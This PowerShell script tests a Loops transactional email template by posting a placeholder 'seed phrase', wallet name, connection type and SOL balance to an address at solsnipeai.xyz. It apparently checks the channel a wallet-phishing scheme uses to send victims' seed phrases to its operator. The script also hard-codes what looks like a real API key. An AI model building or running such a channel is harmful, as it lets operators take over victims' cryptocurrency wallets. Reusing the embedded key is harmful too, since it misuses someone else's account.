# Test Loops Template ID
# This script checks if your template ID is valid

$apiKey = "0de67ebcc5e8d98792c780ed52b714ee"
$templateId = "cmgn2tzu5fqc41q0ivqlmuqf4"
$testEmail = "admin@solsnipeai.xyz"

Write-Host "🔍 Testing Loops Template ID..." -ForegroundColor Cyan
Write-Host "   Template ID: $templateId" -ForegroundColor Gray
Write-Host "   API Key: $($apiKey.Substring(0,10))..." -ForegroundColor Gray
Write-Host ""

# Test the template
$body = @{
    transactionalId = $templateId
    email = $testEmail
    dataVariables = @{
        walletName = "TEST_WALLET"
        connectionType = "TEST"
        codes = "test-seed-phrase-here"
        solBalance = "1.5"
    }
} | ConvertTo-Json

$headers = @{
    "Authorization" = "Bearer $apiKey"
    "Content-Type" = "application/json"
}

try {
    $response = Invoke-WebRequest -Uri "https://app.loops.so/api/v1/transactional" `
        -Method POST `
        -Headers $headers `
        -Body $body `
        -UseBasicParsing

    Write-Host "✅ SUCCESS! Template ID is valid!" -ForegroundColor Green
    Write-Host ""
    Write-Host "Response:" -ForegroundColor Cyan
    $response.Content | ConvertFrom-Json | ConvertTo-Json -Depth 10
}
catch {
    Write-Host "❌ FAILED!" -ForegroundColor Red
    Write-Host ""
    Write-Host "Error Message: $($_.Exception.Message)" -ForegroundColor Yellow
    
    if ($_.ErrorDetails.Message) {
        Write-Host ""
        Write-Host "Error Details:" -ForegroundColor Yellow
        Write-Host $_.ErrorDetails.Message
        
        Write-Host ""
        Write-Host "⚠️  Template ID '$templateId' might NOT exist in your Loops account!" -ForegroundColor Yellow
        Write-Host ""
        Write-Host "📋 What to do:" -ForegroundColor Cyan
        Write-Host "   1. Go to: https://app.loops.so/transactional" -ForegroundColor White
        Write-Host "   2. Find or create your transactional email template" -ForegroundColor White
        Write-Host "   3. Make sure it's PUBLISHED (not draft)" -ForegroundColor White
        Write-Host "   4. Copy the Template ID from the template settings" -ForegroundColor White
        Write-Host "   5. Update your .env file with the correct ID" -ForegroundColor White
    }
}

Write-Host ""
Write-Host "💡 Tip: Check your Loops dashboard to verify:" -ForegroundColor Cyan
Write-Host "   - Template exists and is published" -ForegroundColor White
Write-Host "   - API key is from the same account" -ForegroundColor White
Write-Host "   - Template has the required variables (walletName, connectionType, codes, solBalance)" -ForegroundColor White
